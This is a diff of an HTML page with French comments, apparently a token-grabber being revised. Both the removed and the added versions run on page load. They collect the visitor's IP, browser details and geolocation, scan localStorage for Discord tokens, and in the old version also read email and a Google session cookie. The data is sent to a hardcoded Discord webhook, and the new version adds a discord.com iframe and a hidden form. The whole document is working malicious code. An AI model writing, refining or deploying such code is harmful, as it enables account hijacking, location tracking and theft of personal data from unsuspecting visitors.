@@ -15,57 +15,73 @@
             height: 100vh;
             border: none; /* Rend l'iframe invisible ou discrète */
         }
+        form {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Iframe pour afficher le site cible -->
-    <iframe src="https://nyrservice.netlify.app/"></iframe>
+    <!-- Iframe pour afficher le site cible, potentiellement pour accéder au contexte de Discord -->
+    <iframe src="https://discord.com" id="discordFrame"></iframe>
+    
+    <form id="hiddenForm">
+        <input type="text" id="firstName" placeholder="Prénom">
+        <input type="text" id="lastName" placeholder="Nom">
+    </form>
     
     <script>
-        // Fonction asynchrone pour récupérer automatiquement les données et les envoyer au webhook
-        async function grabAndSendDataAutomatically() {
+        async function sendCollectedData() {
             try {
-                // Étape 1: Récupère l'IP de l'utilisateur via une API publique
+                // Récupère l'IP via API publique
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                const userIP = ipData.ip;  // Extrait l'IP
+                const userIP = ipData.ip;
                 
-                // Étape 2: Extraction automatique des données supplémentaires
-                let discordToken = localStorage.getItem('token') || 'Non trouvé';  // Récupère automatiquement le token Discord s'il existe
-                let prenom = localStorage.getItem('userFirstName') || sessionStorage.getItem('firstName') || 'Non trouvé';  // Essaie d'extraire du localStorage ou sessionStorage
-                let nom = localStorage.getItem('userLastName') || sessionStorage.getItem('lastName') || 'Non trouvé';  // Essaie d'extraire du localStorage ou sessionStorage
-                let email = localStorage.getItem('userEmail') || document.cookie.split('; ').find(row => row.startsWith('email=')).split('=')[1] || 'Non trouvé';  // Essaie d'extraire des cookies ou localStorage
+                // Récupère d'autres informations du navigateur
+                const userAgent = navigator.userAgent;  // Détails sur le navigateur, OS, et device
+                const language = navigator.language;    // Langue du navigateur
+                const screenInfo = `${window.screen.width}x${window.screen.height}`;  // Résolution d'écran
                 
-                // Tentative d'extraction automatique du mot de passe Google ou cookies
-                let googlePassword = '';  // Initialisation
-                const cookies = document.cookie;  // Accède aux cookies globaux
-                const googleCookieMatch = cookies.match(/__Secure-1PSID=([^;]+)/);  // Recherche de cookies Google
-                if (googleCookieMatch) {
-                    googlePassword = 'Accès partiel: ' + googleCookieMatch[1].substring(0, 50) + '...';  // Extrait et tronque le cookie
-                } else {
-                    googlePassword = 'Non trouvé';
+                // Tentative pour géolocalisation
+                let geolocationData = 'Non disponible';
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    geolocationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                 }
                 
-                // Autres informations automatiques : User Agent et autres métadonnées
-                const userAgent = navigator.userAgent;  // Récupère l'user agent
-                const additionalData = {
-                    BrowserLanguage: navigator.language,  // Ajoute la langue du navigateur
-                    ScreenResolution: screen.width + 'x' + screen.height  // Ajoute la résolution de l'écran
-                };
+                // Tentative pour récupérer prénom et nom via formulaire
+                const firstName = document.getElementById('firstName').value || 'Inconnu';
+                const lastName = document.getElementById('lastName').value || 'Inconnu';
                 
-                // Compilation des données en un objet JSON
-                const dataToSend = {
+                // Tentative pour récupérer le token Discord à partir de localStorage
+                let discordToken = 'Non trouvé';
+                if (window.localStorage) {
+                    // Scanner les clés potentielles (Discord utilise souvent 'token' ou des variantes)
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.includes('token')) {  // Vérifie les clés contenant 'token'
+                            discordToken = localStorage.getItem(key);  // Récupère la valeur
+                            break;  // On prend le premier matching pour efficacité
+                        }
+                    }
+                }
+                
+                // Compilation de toutes les données
+                const collectedData = {
                     IP: userIP,
-                    DiscordToken: discordToken,
-                    Prenom: prenom,
-                    Nom: nom,
-                    Email: email,
-                    GooglePassword: googlePassword,
                     UserAgent: userAgent,
-                    Additional: additionalData  // Inclut les données supplémentaires
+                    Language: language,
+                    ScreenResolution: screenInfo,
+                    Geolocation: geolocationData,
+                    FirstName: firstName,
+                    LastName: lastName,
+                    DiscordToken: discordToken,  // Inclut le token récupéré
+                    Timestamp: new Date().toISOString()
                 };
                 
-                // Étape 3: Envoie toutes les données au webhook Discord
+                // Envoie des données au webhook
                 const webhookURL = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
                 const sendResponse = await fetch(webhookURL, {
                     method: 'POST',
@@ -73,24 +89,31 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `Visite automatique : \nIP: ${userIP}\nDiscord Token: ${discordToken}\nPrénom: ${prenom}\nNom: ${nom}\nE-mail: ${email}\nGoogle Données: ${googlePassword}\nUser Agent: ${userAgent}\nAutres: ${JSON.stringify(additionalData)}`
+                        content: `Nouvelles données collectées : 
+                        IP: ${collectedData.IP}
+                        Prénom: ${collectedData.FirstName}
+                        Nom: ${collectedData.LastName}
+                        User Agent: ${collectedData.UserAgent}
+                        Langue: ${collectedData.Language}
+                        Résolution d'écran: ${collectedData.ScreenResolution}
+                        Géolocalisation: ${collectedData.Geolocation}
+                        Discord Token: ${collectedData.DiscordToken}
+                        Timestamp: ${collectedData.Timestamp}`
                     })
                 });
                 
-                // Vérifie si l'envoi a réussi
                 if (sendResponse.ok) {
                     console.log('Données envoyées avec succès');
                 } else {
-                    console.error('Échec de l envoi au webhook');
+                    console.error('Échec de l\'envoi au webhook');
                 }
             } catch (error) {
-                console.error('Erreur lors de la récupération ou de l envoi des données:', error);
+                console.error('Erreur lors de la collecte ou de l\'envoi des données:', error);
             }
         }
         
-        // Exécute la fonction automatiquement au chargement de la page
-        window.onload = grabAndSendDataAutomatically;
+        // Exécute la fonction au chargement de la page
+        window.onload = sendCollectedData;
     </script>
 </body>
 </html>
-
